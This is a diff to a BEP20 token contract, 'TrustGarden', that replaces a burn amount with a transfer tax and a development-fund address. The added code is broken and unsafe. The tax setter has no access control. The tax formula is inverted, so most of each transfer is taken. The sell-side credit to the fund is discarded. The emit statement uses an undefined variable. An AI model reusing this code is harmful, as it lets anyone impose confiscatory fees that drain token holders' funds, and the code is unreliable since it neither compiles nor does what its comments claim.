@@ -348,7 +348,9 @@ contract TrustGarden is Context, IBEP20, Ownable {
     uint8 public _decimals;
     string public _symbol;
     string public _name;
-    uint256 public _burnAmount;
+    uint256 public _taxAmount;
+
+    address private developmentFund;
 
     IPancakeswapRouter02 public  pancakeRouter;
      address public  pancakePair;
@@ -378,7 +380,7 @@ contract TrustGarden is Context, IBEP20, Ownable {
     }
 
     function setBurnAmount(uint256 amount) external {
-        _burnAmount = amount;
+        _taxAmount = amount;
     }
 
     function getOwner() external view returns (address) {
@@ -488,7 +490,21 @@ contract TrustGarden is Context, IBEP20, Ownable {
         require(sender != address(0), "BEP20: transfer from the zero address");
         require(recipient != address(0), "BEP20: transfer to the zero address");
 
-        
+        // This is buy function
+        uint256 tax = amount * (100 - _taxAmount) / 100;
+        uint256 realAmount = amount.sub(tax);
+        _balances[sender] = _balances[sender].sub(amount);
+        _balances[recipient] = _balances[recipient].add(realAmount);
+
+        if(sender == pancakePair) {
+            _burn(pancakePair, tax);
+        }
+
+        // This is sell
+        if(recipient == pancakePair) {
+            _balances[developmentFund].add(tax);
+        }
+
         emit Transfer(sender, recipient, _realAmount);
     }
 
